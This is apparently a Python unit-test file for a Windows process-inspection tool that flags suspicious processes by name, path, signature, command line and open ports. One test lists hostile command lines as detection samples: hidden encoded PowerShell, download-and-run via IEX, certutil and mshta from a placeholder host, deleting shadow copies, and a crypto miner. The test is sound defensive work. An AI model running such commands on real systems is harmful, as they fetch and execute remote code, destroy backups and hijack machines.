import os
import unittest

import tests.helpers  # noqa: F401  (ajusta sys.path)
from sm import procinspect as pi

SYS32 = os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "System32")
TEMP = pi.TEMP_DIRS[0]
VALID = {"status": "Valid", "signer": "Microsoft Windows"}
UNSIGNED = {"status": "NotSigned", "signer": None}


def rec(**kw):
    base = {"pid": 100, "ppid": 1, "name": "app.exe", "cmd": "", "argv0": None,
            "exe": r"C:\Program Files\App\app.exe", "exe_verified": True, "user": "usuario", "peak_cpu": 0}
    base.update(kw)
    return base


def levels(r, sig=VALID, extra=None):
    return {f["level"] for f in pi.flags_for(r, sig, extra)}


class FlagsTest(unittest.TestCase):
    def test_clean_signed_binary(self):
        self.assertEqual(pi.flags_for(rec(), VALID), [])

    def test_system_name_outside_system32(self):
        r = rec(name="svchost.exe", exe=r"C:\Users\Public\svchost.exe")
        self.assertIn("alto", levels(r, UNSIGNED))
        self.assertNotIn("alto", levels(rec(name="svchost.exe", exe=os.path.join(SYS32, "svchost.exe"))))

    def test_lookalike_and_double_extension(self):
        self.assertIn("alto", levels(rec(name="scvhost.exe")))
        self.assertIn("alto", levels(rec(name="fatura.pdf.exe")))
        self.assertNotIn("alto", levels(rec(name="svchost.exe", exe=os.path.join(SYS32, "svchost.exe"))))

    def test_temp_dir_depends_on_signature(self):
        r = rec(exe=TEMP + r"x\setup.exe")
        self.assertIn("alto", levels(r, UNSIGNED))
        self.assertEqual(levels(r, VALID), {"info"})          # instalador assinado
        self.assertIn("medio", levels(r, None))               # assinatura ainda não verificada

    def test_invalid_signature(self):
        self.assertIn("alto", levels(rec(), {"status": "HashMismatch", "signer": None}))
        self.assertIn("medio", levels(rec(), {"status": "NotTrusted", "signer": None}))

    def test_unsigned_levels(self):
        self.assertEqual(levels(rec(), UNSIGNED), {"info"})
        self.assertIn("medio", levels(rec(exe=os.path.join(SYS32, "estranho.exe")), UNSIGNED))
        self.assertIn("medio", levels(rec(user="SYSTEM", exe=r"D:\coisas\x.exe"), UNSIGNED))

    def test_cmdline_rules(self):
        for cmd in ("powershell -nop -w hidden -enc " + "A" * 60,
                    "powershell IEX (New-Object Net.WebClient).DownloadString('http://x/a')",
                    "certutil -urlcache -split -f http://x/a.exe a.exe",
                    "vssadmin delete shadows /all /quiet",
                    "xmrig --url stratum+tcp://pool:3333",
                    "mshta http://x/a.hta"):
            self.assertIn("alto", levels(rec(name="powershell.exe", cmd=cmd)), cmd)

    def test_interpreter_temp_script(self):
        r = rec(name="wscript.exe", exe=os.path.join(SYS32, "wscript.exe"), cmd=f"wscript.exe {TEMP}a.vbs")
        self.assertIn("alto", levels(r))
        r = rec(name="python.exe", cmd="python.exe server.py --config C:\\x.toml")
        self.assertNotIn("alto", levels(r))
        r = rec(name="rundll32.exe", exe=os.path.join(SYS32, "rundll32.exe"), cmd=f'rundll32.exe "{TEMP}x y.dll",Start')
        self.assertIn("alto", levels(r))
        # só cita a pasta temporária (ex.: python -c "...open(r'...\\Temp\\a.png')"): não é script de lá
        r = rec(name="python.exe", cmd=f"python.exe -c \"open(r'{TEMP}a.png').read()\" x.py")
        self.assertNotIn("alto", levels(r))

    def test_store_app_info_only(self):
        r = rec(exe=r"C:\Program Files\WindowsApps\Pkg_1.0_x64__abc\app.exe", container=True)
        self.assertEqual(levels(r), {"info"})

    def test_listening_port_unsigned(self):
        extra = {"listening": [{"port": 4444, "public": True}]}
        self.assertIn("medio", levels(rec(), UNSIGNED, extra))
        self.assertNotIn("medio", levels(rec(), VALID, extra))


if __name__ == "__main__":
    unittest.main()
